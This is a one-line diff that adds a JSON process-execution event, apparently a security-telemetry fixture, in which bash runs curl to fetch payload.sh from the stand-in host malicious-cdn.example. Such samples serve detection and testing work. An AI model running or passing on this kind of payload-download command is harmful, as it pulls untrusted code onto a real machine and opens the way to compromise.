@@ -1,0 +1,1 @@
+{"time":"2026-07-11T10:32:00.100Z","process":{"executable":{"path":"/bin/bash"},"ppid":600,"audit_token":{"pid":2210,"euid":501}},"event":{"exec":{"target":{"executable":{"path":"/usr/bin/curl"}},"args":["curl","-fsSL","http://malicious-cdn.example/payload.sh"]}}}
